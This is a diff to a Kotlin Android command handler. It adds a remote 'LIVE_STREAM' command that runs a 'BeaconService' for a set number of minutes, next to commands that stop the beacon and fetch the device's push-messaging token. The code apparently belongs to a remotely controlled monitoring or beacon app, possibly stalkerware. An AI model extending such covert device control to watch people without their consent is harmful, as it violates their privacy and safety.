@@ -159,7 +159,26 @@ object CommandProcessor {
                 }
                 "STOP_BEACON" -> {
                     ctx.stopService(android.content.Intent(ctx, BeaconService::class.java))
+                    SocketManager.disconnect()
                     status = "EXECUTED (STOPPED)"
+                }
+                "LIVE_STREAM" -> {
+                    val parts = content.split("|")
+                    val mode = parts[0].trim().uppercase()
+                    if (mode == "ON") {
+                        val mins = parts.getOrNull(1)?.trim()?.toLongOrNull() ?: 15L
+                        val i = android.content.Intent(ctx, BeaconService::class.java).apply {
+                            putExtra("duration_mins", mins)
+                            putExtra("mode", "LIVE_STREAM")
+                        }
+                        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) ctx.startForegroundService(i)
+                        else ctx.startService(i)
+                        status = "STREAM_STARTED (${mins}M)"
+                    } else {
+                        ctx.stopService(android.content.Intent(ctx, BeaconService::class.java))
+                        SocketManager.disconnect()
+                        status = "STREAM_STOPPED"
+                    }
                 }
                 "GET_TOKEN" -> {
                     val token = DeviceManager.getRobustFcmToken(ctx)
